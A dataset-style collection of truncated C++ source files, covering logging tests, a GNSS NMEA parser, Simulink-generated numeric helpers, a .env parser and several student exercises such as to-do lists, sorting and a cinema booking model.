result.add_result(log_str.end_with(\"[F]\\t[ModuleA.SystemA.ClassA]\\tconnect {{}:{}}\"), \"brace test 2\");\n            }\n\n            {\n                int32_t* pointer = NULL;\n                log_inst.error(log_inst.cat.ModuleB, \"NULL Pointer Str Test {}, {}\", pointer, pointer);\n                result.add_result(log_str.end_with(\"[E]\\t[ModuleB]\\tNULL Pointer Str Test null, null\"), \"log update 4\");\n            }\n\n            {\n                test_output_dynamic(bq::log_level::info, \"testing multithread string log. wait for 10 seconds please...\\n if error exist, an assert will be triggered\\n\");\n\n                multi_thread_string_test_modifier modifier_thread;\n                modifier_thread.start();\n\n                uint64_t start_time = bq::platform::high_performance_epoch_ms();\n                while (true) {\n                    bq::string test_str = \"123456789\";\n                    for (uint32_t i = 0; i < 512; ++i) {\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:0>+10d}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:0^+10d}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:0<+10d}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:<>10d}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:<^10d}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:0>15} |{:<<10d}|\", multi_thread_string_test_str, test_str, i);\n\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:<15} |{:0>+10.3f}|\", multi_thread_string_test_str, test_str, i * 3.1415);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:<15} |{:<<+10b}|\", multi_thread_string_test_str, test_str, i);\n                        log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"multi_thread Str Test {} {:<15} |{:<<+#10b}|\", multi_thread_string_test_str, test_str, i);\n    ",
    "#include \"Iclient.h\"\n\nusing std::string;\n\n\nbool comp(const struct student &s1, const struct student &s2){\n    \n    if(s1.number == s2.number){\n        return s1.grade > s2.grade;\n    }\n    else{\n        return s1.number > s2.number;\n    }\n}\n\nvoid serialStudent(const struct student &s, char* buffer){\n    size_t offset = s.name.size();\n    \n    strcpy(buffer, s.name.c_str());\n    buffer[offset++] = '\\0';\n\n    memcpy(buffer + offset, &s.number, sizeof(long));\n    offset += sizeof(long);\n\n    memcpy(buffer + offset, &s.grade, sizeof(long));\n}\n\nvoid unserialStudent(struct student &s, char* const buffer){\n    size_t offset = strlen(buffer);\n    s.name = string(buffer, offset++);\n\n    memcpy(&s.number, buffer + offset, sizeof(long));\n    offset += sizeof(long);\n\n    memcpy(&s.grade, buffer + offset, sizeof(long));\n}\n\nvoid InfoStu2stu(struct student &s, const InfoStudent &infoS){\n    s.name = infoS.name;\n    s.grade = infoS.grade;\n    s.number = infoS.number;\n}\n\nvoid stu2InfoStu(const struct student &s, InfoStudent &infoS){\n    s.name.copy(infoS.name, sizeof(infoS.name)-1);\n    infoS.grade = s.grade;\n    infoS.number = s.number;\n}\n\n",
    "/* Copyright (c) 2017-2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n#define LOG_TAG \"LocSvc_SystemStatus\"\n\n#include <inttypes.h>\n#include <string>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/time.h>\n#include <pthread.h>\n#include <loc_pla.h>\n#include <log_util.h>\n#include <loc_nmea.h>\n#include <DataItemsFactoryProxy.h>\n#include <SystemStatus.h>\n#include <SystemStatusOsObserver.h>\n#include <DataItemConcreteTypesBase.h>\n\nnamespace loc_core\n{\n\n/******************************************************************************\n SystemStatusNmeaBase - base class for all NMEA parsers\n******************************************************************************/\nclass SystemStatusNmeaBase\n{\nprotected:\n    std::vector<std::string> mField;\n\n    SystemStatusNmeaBase(const char *str_in, uint32_t len_in)\n    {\n        // check size and talker\n        if (!loc_nmea_is_debug(str_in, len_in)) {\n            return;\n        }\n\n        std::string parser(str_in);\n        std::string::size_type index = 0;\n\n        // verify checksum field\n        index = parser.find(\"*\");\n        if (index == std::string::npos) {\n            return;\n        }\n        parser[index] = ',';\n\n        // tokenize parser\n        while (1) {\n            std::string str;\n            index = parser.find(\",\");\n            if (index == std::string::npos) {\n                break;\n            }\n            str = parser.substr(0, index);\n            parser = parser.substr(index + 1);\n            mField.push_back(str);\n        }\n    }\n\n    virtual ~SystemStatusNmeaBase() { }\n\npublic:\n    static const uint32_t NMEA_MINSIZE = DEBUG_NMEA_MINSIZE;\n    static const uint32_t NMEA_MAXSIZE = DEBUG_NMEA_MAXSIZE;\n};\n\n/******************************************************************************\n SystemStatusPQWM1\n******************************************************************************/\nclass SystemStatusPQWM1\n{\npublic:\n    uint16_t mGpsWeek;    // x1\n    uint32_t mGpsTowMs;   // x2\n    uint8_t  mTimeValid;  // x3\n    uint8_t  mTimeSource; // x4\n    int32_t  mTimeUnc;    // x5\n    int32_t  mClockFreqBias; // x6\n    int32_t  mClockFreqBiasUnc; // x7\n    uint8_t  mXoState;    // x8\n    int32_t  mPgaGain;    // x9\n    uint32_t mGpsBpAmpI;  // xA\n    uint32_t mGpsBpAmpQ;  // xB\n    uint32_t mAdcI;       // xC\n    uint32_t mAdcQ;       // xD\n    uint32_t mJammerGps;  // xE\n    uint32_t mJammerGlo;  // xF\n    uint32_t mJammerBds;  // x10\n    uint32_t mJammerGal;  // x11\n    uint32_t mRecErrorRecovery; // x12\n    double   mAgcGps;     // x13\n    double   mAgcGlo;     // x14\n    double   mAgcBds;     // x15\n    double   mAgcGal;     // x16\n    int32_t  mLeapSeconds;// x17\n    int32_t  mLeapSecUnc; // x18\n    uint32_t mGloBpAmpI;  // x19\n    uint32_t mGloBpAmpQ;  // x1A\n    uint32_t mBdsBpAmpI;  // x1B\n    uint32_t mBdsBpAmpQ;  // x1C\n    uint32_t mGalBpAmpI;  // x1D\n    uint32_t mGalBpAmpQ;  // x1E\n    uint64_t mTimeUncNs;  // x1F\n};\n\n// parser\nclass SystemStatusPQWM1parser : public SystemStatusNmeaBase\n{\nprivate:\n    enum\n    {\n        eTalker = 0,\n        eGpsWeek = 1,\n        eGpsTowMs = 2,\n        eTimeValid = 3,\n        eTimeSource = 4,\n        eTimeUnc = 5,\n        eClockFreqBias = 6,\n        eClockFreqBiasUnc = 7,\n        eXoState = 8,\n        ePgaGain = 9,\n        eGpsBpAmpI = 10,\n        eGpsBpAmpQ = 11,\n        eAdcI = 12,\n        eAdcQ = 13,\n        eJammerGps = 14,\n        eJammerGlo = 15,\n        eJammerBds = 16,\n        eJammerGal = 17,\n        eRe",
    "\n#include <iostream>\n\nusing namespace std; \nclass Movie {\nprivate:\n\tstring name;\n\tint time=0, year=0, review=0;\npublic:\n\tMovie() {\n\n\t}\n\tMovie(string name, int time, int year, int review) {\n\t\tthis->name = name;\n\t\tthis->time = time;\n\t\tthis->year = year;\n\t\tthis->review = review;\n\t\t\n\t}\n\t\n\tvoid setName(string name) {\n\t\tthis-> name = name;\n\t}\n\tvoid setTime(int time) {\n\t\tthis->time = time;\n\t}\n\tvoid setYear(int year) {\n\t\tthis->year = year;\n\t}\n\tvoid setReview(int review) {\n\t\tthis-> review = review;\n\t}\n\n\tstring getName() {\n\t\treturn this->name; // conseguir un atributo\n\t}\n\tint getTime() {\n\t\treturn this->time;\n\t}\n\tint getYear() {\n\t\treturn this-> year;\n\t}\n\tint getReview() {\n\t\treturn this->review;\n\t}\n\tvoid MostrarInfo() {\n\t\tcout << \" Pelicula: \" << name << \"A\u00f1o: \" << year << \"Review: \" << review << \"Duracion: \" << time<< endl;\n\t}\n};\n\nclass Schedule {\nprivate:\n\tint startTime = 0, finishTime = 0;\n\tstring date;\n\npublic:\n\n\tSchedule() {\n\n\t}\n\tSchedule(int startTime, int finishTime, string date) {\n\t\tthis->startTime = startTime;\n\t\tthis->finishTime = finishTime;\n\t\tthis->date = date;\n\n\t}\n\tvoid setstartTime(int startTime) {\n\t\tthis->startTime = startTime;\n\n\t}\n\tvoid setfinishTime(int finishTime) {\n\t\tthis->finishTime = finishTime;\n\n\t}\n\tvoid setDate(string date) {\n\t\tthis->date = date;\n\n\t}\n\tint getstartTime() {\n\t\treturn this->startTime;\n\t}\n\tint getfinishTime() {\n\t\treturn this->finishTime;\n\t}\n\tstring getDate() {\n\t\treturn this->date;\n\t}\n};\nclass Butaca {\nprivate:\n\tint id = 0, cantidadButacas = 5;\n\tstring state;\n\npublic:\n\tButaca() {\n\n\t}\n\tButaca(int id, string state) {\n\t\tthis->id = id;\n\t\tthis->state = state;\n\t}\n\tvoid setIdentificacion(int id) {\n\t\tthis->id = id;\n\t}\n\tvoid setState(string state) {\n\t\tthis->state = state;\n\t}\n\tint getIdentificacion(int id) {\n\t\treturn this->id = rand() % 100;\n\t}\n\tstring getState(string state) {\n\t\t\n\n\t};\n};\n\tclass Room {\n\tprivate:\n\t\tint number, manysits;\n\t\tdouble price;\n\t\tButaca asientos[10][10];//matriz \n\tpublic:\n\t\tRoom() {\n\n\t\t}\n\t\tRoom  (int number, int manysits, double price ) {\n\t\t\tthis->number = number;\n\t\t\tthis->manysits = manysits;\n\t\t}\n\t\tvoid setNumber(int number) {\n\t\t\tthis->number = number;\n\t\t}\n\t\tvoid setManysits(int manysits) {\n\t\t\tthis->manysits = manysits;\n\t\t}\n\t\tvoid serPrice(double price) {\n\t\t\tthis->price = price;\n\t\t}\n\t\tint getFreeSits(int number, int manysits) {\n\t\t\t\n\t\t}\n\n\n\n\t};\n\tclass Reserve {\n\tprivate:\n\t\tstring pelicula;\n\t\tSchedule schedule[3];\n\t\tButaca reserva[100];//atributos \n\t\tdouble Totalprice;\n\t\tint  number_reserve;\n\n\tpublic:\n\t\tReserve() {\n\n\t\t}\n\t};\n\tclass venta {\n\tprivate:\n\t\tReserve reserve;\n\t\tint id_client;\n\tpublic:\n\n\t};\n\tclass Cinema {\n\tprivate:\n\t\tMovie Movie[10];\n\t\tSchedule schedule[10];\n\t\tRoom room[10];\n\t\tReserve reserve[50];\n\t\tButaca butaca[50];\n\tpublic:\n\n\t};\n\n\t\n",
    "#include \"env_parser.h\"\n#include <fstream>\n#include <sstream>\n#include <stdexcept>\n\nstd::unordered_map<std::string, std::string> load_env(const std::string& file_path) {\n    std::unordered_map<std::string, std::string> env_vars;\n    std::ifstream file(file_path);\n\n    if (!file.is_open()) {\n        throw std::runtime_error(\"Failed to open .env file\");\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n        \n        if (line.empty() || line[0] == '#') continue;\n\n        \n        std::istringstream iss(line);\n        std::string key, value;\n\n        if (std::getline(std::getline(iss, key, '=') >> std::ws, value)) {\n            env_vars[key] = value;\n        }\n    }\n\n    file.close();\n    return env_vars;\n}\n\nvoid save_env(const std::string& file_path, const std::unordered_map<std::string, std::string>& env_vars) {\n    std::ofstream file(file_path);\n\n    if (!file.is_open()) {\n        throw std::runtime_error(\"Failed to open .env file for writing\");\n    }\n\n    for (const auto& pair : env_vars) {\n        file << pair.first << \"=\" << pair.second << \"\\n\";\n    }\n\n    file.close();\n}\n",
    "#include <iostream>\n#include <string.h>\nusing namespace std;\n\nbool checkPalindrom(string str, int i, int j)\n{\n    while (i <= j)\n    {\n        if (str[i] == str[j])\n        {\n            return true;\n            i++;\n            j--;\n        }\n        else\n        {\n            return false;\n        }\n    }\n}\n\nbool conertToPalindrom(string str)\n{\n    int i = 0;\n    int j = str.length() - 1;\n    while (i <= j)\n    {\n        if (str[i] != str[j])\n        {\n            int a = checkPalindrom(str, i + 1, j);\n            int b = checkPalindrom(str, i, j - 1);\n            return a || b;\n        }\n        else\n        {\n            i++;\n            j--;\n        }\n    }\n\n    return true;\n}\n\nint main()\n{\n    char str[100];\n    cout << \"Enter a string:-\";\n    cin.getline(str, 100);\n    bool ans = conertToPalindrom(str);\n    if (ans == 1)\n    {\n        cout << str << \"  can be converted to a palindrom.\";\n    }\n    else\n    {\n        cout << str << \" cant be converted to a palindrom.\";\n    }\n\n    return 0;\n}",
    "//\n// File: GHAC_ctrl_swingUp.cpp\n//\n// Code generated for Simulink model 'GHAC_ctrl_swingUp'.\n//\n// Model version                  : 1.7\n// Simulink Coder version         : 23.2 (R2023b) 01-Aug-2023\n// C/C++ source code generated on : Thu Apr 11 17:10:01 2024\n//\n// Target selection: ert.tlc\n// Embedded hardware selection: ARM Compatible->ARM Cortex-M\n// Code generation objectives:\n//    1. Execution efficiency\n//    2. RAM efficiency\n// Validation result: Not run\n//\n#include \"GHAC_ctrl_swingUp.h\"\n#include \"rtwtypes.h\"\n#include <cmath>\n#include <stddef.h>\n#define NumBitsPerChar                 8U\n\nstatic real_T look1_binlx(real_T u0, const real_T bp0[], const real_T table[],\n  uint32_T maxIndex);\nextern \"C\"\n{\n  real_T rtInf;\n  real_T rtMinusInf;\n  real_T rtNaN;\n  real32_T rtInfF;\n  real32_T rtMinusInfF;\n  real32_T rtNaNF;\n}\n\nextern \"C\"\n{\n  //\n  // Initialize rtNaN needed by the generated code.\n  // NaN is initialized as non-signaling. Assumes IEEE.\n  //\n  static real_T rtGetNaN(void)\n  {\n    size_t bitsPerReal{ sizeof(real_T) * (NumBitsPerChar) };\n\n    real_T nan{ 0.0 };\n\n    if (bitsPerReal == 32U) {\n      nan = rtGetNaNF();\n    } else {\n      union {\n        LittleEndianIEEEDouble bitVal;\n        real_T fltVal;\n      } tmpVal;\n\n      tmpVal.bitVal.words.wordH = 0xFFF80000U;\n      tmpVal.bitVal.words.wordL = 0x00000000U;\n      nan = tmpVal.fltVal;\n    }\n\n    return nan;\n  }\n\n  //\n  // Initialize rtNaNF needed by the generated code.\n  // NaN is initialized as non-signaling. Assumes IEEE.\n  //\n  static real32_T rtGetNaNF(void)\n  {\n    IEEESingle nanF{ { 0.0F } };\n\n    nanF.wordL.wordLuint = 0xFFC00000U;\n    return nanF.wordL.wordLreal;\n  }\n}\n\nextern \"C\"\n{\n  //\n  // Initialize the rtInf, rtMinusInf, and rtNaN needed by the\n  // generated code. NaN is initialized as non-signaling. Assumes IEEE.\n  //\n  static void rt_InitInfAndNaN(size_t realSize)\n  {\n    (void) (realSize);\n    rtNaN = rtGetNaN();\n    rtNaNF = rtGetNaNF();\n    rtInf = rtGetInf();\n    rtInfF = rtGetInfF();\n    rtMinusInf = rtGetMinusInf();\n    rtMinusInfF = rtGetMinusInfF();\n  }\n\n  // Test if value is infinite\n  static boolean_T rtIsInf(real_T value)\n  {\n    return (boolean_T)((value==rtInf || value==rtMinusInf) ? 1U : 0U);\n  }\n\n  // Test if single-precision value is infinite\n  static boolean_T rtIsInfF(real32_T value)\n  {\n    return (boolean_T)(((value)==rtInfF || (value)==rtMinusInfF) ? 1U : 0U);\n  }\n\n  // Test if value is not a number\n  static boolean_T rtIsNaN(real_T value)\n  {\n    boolean_T result{ (boolean_T) 0 };\n\n    size_t bitsPerReal{ sizeof(real_T) * (NumBitsPerChar) };\n\n    if (bitsPerReal == 32U) {\n      result = rtIsNaNF((real32_T)value);\n    } else {\n      union {\n        LittleEndianIEEEDouble bitVal;\n        real_T fltVal;\n      } tmpVal;\n\n      tmpVal.fltVal = value;\n      result = (boolean_T)((tmpVal.bitVal.words.wordH & 0x7FF00000) ==\n                           0x7FF00000 &&\n                           ( (tmpVal.bitVal.words.wordH & 0x000FFFFF) != 0 ||\n                            (tmpVal.bitVal.words.wordL != 0) ));\n    }\n\n    return result;\n  }\n\n  // Test if single-precision value is not a number\n  static boolean_T rtIsNaNF(real32_T value)\n  {\n    IEEESingle tmp;\n    tmp.wordL.wordLreal = value;\n    return (boolean_T)( (tmp.wordL.wordLuint & 0x7F800000) == 0x7F800000 &&\n                       (tmp.wordL.wordLuint & 0x007FFFFF) != 0 );\n  }\n}\n\nextern \"C\"\n{\n  //\n  // Initialize rtInf needed by the generated code.\n  // Inf is initialized as non-signaling. Assumes IEEE.\n  //\n  static real_T rtGetInf(void)\n  {\n    size_t bitsPerReal{ sizeof(real_T) * (NumBitsPerChar) };\n\n    real_T inf{ 0.0 };\n\n    if (bitsPerReal == 32U) {\n      inf = rtGetInfF();\n    } else {\n      union {\n        LittleEndianIEEEDouble bitVal;\n        real_T fltVal;\n      } tmpVal;\n\n      tmpVal.bitVal.words.wordH = 0x7FF00000U;\n      tmpVal.bitVal.words.wordL = 0x00000000U;\n      inf = tmpVal.fltVal;\n    }\n\n    return inf;\n  }\n\n  //\n  // Initialize rtInfF needed by the generated code.\n  // Inf is initialized as non-signaling. Assumes IEEE.\n  //\n  static real32_T rtGetInfF(void)\n  {\n    IEEESingle infF;\n    infF.wordL.wordLuint = 0x7F800000U;\n    return infF.wordL.wordLreal;\n  }\n\n  //\n  // Initialize rtMinusInf needed by the generated code.\n  // Inf is initialized as non-signaling. Assumes IEEE.\n  //\n  static real_T rtGetMinusInf(void)\n  {\n    size_t bitsPerReal{ sizeof(real_T) * (NumBitsPerChar) };\n\n    real_T minf{ 0.0 };\n\n    if (bitsPerReal == 32U) {\n      minf = rtGetMinusInfF();\n    } else {\n      union {\n        LittleEndianIEEEDouble bitVal;\n        real_T fltVal;\n      } tmpVal;\n\n      tmpVal.bitVal.words.wordH = 0xFFF00000U;\n      tmpVal.bitVal.words.wordL = 0x00000000U;\n      minf = tmpVal.fltVal;\n    }\n\n    return minf;\n  }\n\n  //\n  // Initialize rtMinusInfF needed by the generated code.\n  // Inf is initialized as non-signaling. Assumes IEEE.\n  //\n  static real32_T rtGetMinusInfF(void)\n  {\n    IEEESingle minfF;\n    minfF.wordL.wordLuint = 0xFF800000U;",
    "//----------------PROJE 1---------------------\n//Write a program in C++ to implement stack using array, push 5 values [10,20,30,40,50] in the stack and display them.\n\n#include <iostream> // This allows us to use cout for output\nusing namespace std;\n\n// Define the maximum size of the stack\n#define MAX 100\n\n// The Stack class has two main variables: top (to track the top element) and arr (the array to store stack elements).\n// The constructor Stack() initializes top to -1, indicating the stack is empty.\nclass Stack {\n    int top; // Index of the top element\n    int arr[MAX]; // Array to hold stack elements\n\npublic:\n    // Constructor to initialize the stack\n    Stack() {\n        top = -1; // Initial top index is -1 indicating stack is empty\n    }\n\n    // Push Method:\n    // void push(int value) adds a new element to the stack.\n    // If top is greater than or equal to MAX - 1, it means the stack is full, and we print \"Stack Overflow\".\n    // Otherwise, we increment top and add the value to the stack.\n    void push(int value) {\n        if (top >= MAX - 1) { // Check if stack is full\n            cout << \"Stack Overflow\" << endl;\n        } else {\n            top++; // Move top to the next position\n            arr[top] = value; // Add the value to the stack\n        }\n    }\n\n    // Display Method:\n    // void display() prints all elements of the stack from top to bottom.\n    // If top is -1, it means the stack is empty, and we print \"Stack is empty\".\n    // Otherwise, we print the elements of the stack starting from the top.\n    void display() {\n        if (top == -1) {\n            cout << \"Stack is empty\" << endl;\n        } else {\n            cout << \"Stack elements are: \" << endl;\n            for (int i = top; i >= 0; i--) {\n                cout << arr[i] << \" \"; // Print stack elements\n            }\n            cout << endl;\n        }\n    }\n};\n\n// Main Function: we will display and test the algorithm and project\n// In main(), we create a Stack object.\n// We push the values 10, 20, 30, 40, 50 onto the stack.\n// Finally, we call stack.display() to print the elements of the stack.\nint main() {\n    Stack stackObj; // Create a stack object\n\n    stackObj.push(10); // Push values onto the stack\n    stackObj.push(20);\n    stackObj.push(30);\n    stackObj.push(40);\n    stackObj.push(50);\n\n    stackObj.display(); // Display stack elements\n\n    return 0;\n}\n\n\n\n//-------------------------PROJE 2-------------------------\n//Write a program in C++ to calculate Factorial of a given number (below 10) using recursion.\n\n\n\n#include <iostream> // Include iostream library for input and output\nusing namespace std;\n\n// Function to calculate factorial using recursion\nint factorial(int num) {\n    if (num <= 1) {\n        return 1; // Base case: factorial of 0 or 1 is 1\n    } else {\n        return num * factorial(num - 1); // Recursive case: num * factorial of (num - 1)\n    }\n}\n\n// Main function to test the factorial function and display the result\nint main() {\n    int number; // Variable to store user input\n\n    // Ask the user to enter a number\n    cout << \"Enter a number below 10 to calculate its factorial: \";\n    cin >> number; // Read the number from the user\n\n    // Validate the input\n    if (number < 0 || number >= 10) {\n        cout << \"Please enter a valid number between 0 and 9\" << endl;\n        return 1; // Exit the program if the input is invalid\n    }\n\n    // Call the factorial function and store the result\n    int result = factorial(number);\n\n    // Display the result\n    cout << \"Factorial of \" << number << \" is: \" << result << endl;\n\n    return 0; // Indicate that the program ended successfully\n}\n\n\n//----------------------------------PROJE 3----------------------\n//Write a program in C++ to bubble sort an array.\n\n\n#include <iostream>\nusing namespace std;\n\n// Function to perform bubble sort on an array\nvoid bubbleSorting(int array[], int size) {\n    for (int i = 0; i < size - 1; i++) {\n        for (int j = 0; j < size - i - 1; j++) {\n            if (array[j] > array[j + 1]) {\n                int temp = array[j]; // Temporary variable to hold the value of array[j]\n                array[j] = array[j + 1]; // Swap elements\n                array[j + 1] = temp; // Continue swapping\n            }\n        }\n    }\n}\n\n// Function to print the array\nvoid printArray(int array[], int size) {\n    for (int i = 0; i < size; i++) {\n        cout << array[i] << \" \";\n    }\n    cout << endl;\n}\n\nint main() {\n    // Define and sort multiple arrays\n    int array1[] = {1, 2, 3, 4, 5};\n    int size1 = sizeof(array1) / sizeof(array1[0]);\n    cout << \"Unsorted array1: \";\n    printArray(array1, size1);\n    bubbleSorting(array1, size1);\n    cout << \"Sorted array1: \";\n    printArray(array1, size1);\n\n    int array2[] = {2, 4, 6, 8};\n    int size2 = sizeof(array2) / sizeof(array2[0]);\n    cout << \"Unsorted array2: \";\n    printArray(array2, size2);\n    bubbleSorting(array2, size2);\n    cout << \"Sorted array2: \";\n    printArray(array2, size2);\n\n    int array3",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n\nusing namespace std;\n\n// Function to write the tasks to a file\nvoid addToFile(const vector<string>& tasks, string filename) {\n    // Opening stream for writing in binary mode\n    ofstream file(filename, ios::binary);\n    if (file.is_open()) {\n        // Writing tasks to the file\n        for (int i = 0; i < tasks.size(); i++){\n            file << i + 1 << \". \" << tasks[i] << endl;\n        }\n        cout << \"List successfully added to file: \" << filename << endl;\n        file.close();           \n    } else {\n        // If file could not be opened\n        cerr << \"Failed to open file.\" << endl;\n    }\n}\n\n// Function to read the tasks from a file\nvoid readFromFile(string filename) {\n    string line;\n    // Opening stream for reading in binary mode\n    ifstream file(filename, ios::binary);\n    if (file.is_open()) {\n        // Reading lines from the file and displaying them\n        while (getline(file, line)){\n            cout << line << std::endl;\n        }\n        file.close();\n    } else {\n        // If file could not be opened\n        cerr << \"Failed to open file.\" << endl;\n    }\n}\n\n// Function to display the tasks in the console\nvoid displayTasks(const vector<string>& tasks) {\n    if (tasks.size() == 0){\n        // If no tasks are present\n        cout << \"\\nTo-Do List is empty.\\n\";\n    } else {\n        // Displaying the tasks\n        cout << \"\\nTo-Do List:\" << endl;\n        for (size_t i = 0; i < tasks.size(); ++i) {\n            cout << i + 1 << \". \" << tasks[i] << endl;\n        }\n    }\n}\n\nint main() {\n    vector<string> tasks; // Vector to store the tasks\n    int choice; // Variable to store user choice\n    string task, line;\n    string filename = \"data.txt\"; // Filename for storing tasks\n\n    // Load existing tasks from file\n    ifstream file(filename, ios::binary);\n    file.ignore(3); // Ignore the first 3 characters (assuming a specific file format)\n    while(getline(file, line)){\n        file.ignore(3); // Ignore the next 3 characters\n        tasks.push_back(line);\n    }\n\n    do {\n        // Displaying the menu\n        cout << \"\\nSelection table:\\n\";\n        cout << \"____________________\\n\";\n        cout << \"|1. Add task       |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|2. Delete task    |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|3. View tasks     |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|4. Save to file   |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|5. Read from file |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|6. Clear list     |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"|0. Exit           |\\n\";\n        cout << \"|__________________|\\n\";\n        cout << \"\\nEnter your choice: \";\n\n        // Getting user choice\n        if (!(std::cin >> choice)) {\n            // Handling invalid input\n            std::cerr << \"Invalid task number!\" << std::endl;\n            std::cin.clear(); // Clear error flag\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); // Ignore rest of the input\n            continue;\n        }\n\n        switch (choice) {\n            case 1:\n                // Adding a new task\n                cout << \"Enter the task: \";\n                cin.ignore(); // Clear the newline left by previous input\n                getline(cin, task); // Get the full line of task description\n                tasks.push_back(task);\n                break;\n\n            case 2:\n                // Deleting a task\n                int taskIndex;\n                displayTasks(tasks); // Display current tasks\n                cout << \"Enter the task number to delete: \";\n                cin >> taskIndex; // Get the task number to delete\n                if (taskIndex > 0 && taskIndex <= tasks.size()) {\n                    // Valid task number, erase the task\n                    tasks.erase(tasks.begin() + taskIndex - 1);\n                } else {\n                    // Invalid task number\n                    cout << \"Invalid task number!\" << endl;\n                }\n                break;\n\n            case 3:\n                // Viewing tasks\n                displayTasks(tasks);\n                break;\n\n            case 4:\n                // Saving tasks to file\n                addToFile(tasks, filename);\n                break;\n\n            case 5:\n                // Reading tasks from file\n                readFromFile(filename);\n                break;\n\n            case 6:\n                // Clearing all tasks\n                tasks.clear();\n                break;\n\n            case 0:\n                // Exiting the program\n                cout << \"Exiting...\" << endl;\n                break;\n\n            default:\n                // Handling invalid menu choice\n                cout << \"Invalid choice! Please try again.\" << endl;\n        }\n    } while (choice != 0); // Loop until user chooses to exit\n\n    ret",
    "#include <QGridLayout>\n#include <QHBoxLayout>\n#include <QLabel>\n#include <QListWidget>\n#include <QPushButton>\n#include <QSqlError>\n#include <QSqlQuery>\n#include <qboxlayout.h>\n#include <qicon.h>\n#include <qlabel.h>\n#include <qlist.h>\n#include <qlistwidget.h>\n#include <qlogging.h>\n#include <qsharedpointer.h>\n#include <qsqlquery.h>\n#include <qtmetamacros.h>\n\n#include \"../utils/styleManager.hpp\"\n#include \"task.hpp\"\n#include \"taskManager.hpp\"\n#include \"todoWidget.hpp\"\n\nTodoWidget::TodoWidget(QWidget *parent) : QWidget(parent) {\n\n  TaskManager *taskManager = new TaskManager(this);\n\n  tasksList = new QListWidget(this);\n  tasksList->setSpacing(8);\n  QGridLayout *todoLayout = new QGridLayout(this);\n  todoLayout->setVerticalSpacing(16);\n  todoLayout->addWidget(taskManager, 0, 0, 1, 1);\n  todoLayout->addWidget(tasksList, 1, 0, 15, 1);\n  setLayout(todoLayout);\n  setObjectName(\"todoWidget\");\n\n  refreshTasksList();\n  connect(taskManager, &TaskManager::addTaskSignal, this,\n          &TodoWidget::handleAddTask);\n  connect(taskManager, &TaskManager::processButtonClicked, this,\n          &TodoWidget::handleProcessButton);\n}\nvoid TodoWidget::refreshTasksList() {\n  int totalTasks = tasksList->count();\n  for (int i = totalTasks - 1; i >= 0; i--) {\n    QListWidgetItem *item = tasksList->item(i);\n    delete tasksList->itemWidget(item);\n    delete item;\n  }\n\n  QSqlQuery query(\"SELECT id FROM tasks ORDER BY priority DESC\");\n  while (query.next()) {\n    QVariant id = query.value(0);\n    TaskWidget *taskWidget = new TaskWidget(id.toInt(), nullptr);\n    QListWidgetItem *item = new QListWidgetItem(tasksList);\n    item->setSizeHint(QSize(taskWidget->width(), taskWidget->height()));\n    tasksList->setItemWidget(item, taskWidget);\n    connect(taskWidget, &TaskWidget::deleteTaskSignal, this,\n            &TodoWidget::handleDeleteTask);\n    connect(taskWidget, &TaskWidget::addProjectTask, this,\n            [this](int taskId) { emit addProjectTask(taskId); });\n  }\n}\n\nvoid TodoWidget::handleDeleteTask(int id) {\n  for (int i = 0; i < tasksList->count(); i++) {\n    QListWidgetItem *item = tasksList->item(i);\n    if (tasksList->itemWidget(item) == sender()) {\n      delete tasksList->itemWidget(item);\n      delete tasksList->takeItem(i);\n      break;\n    }\n  }\n 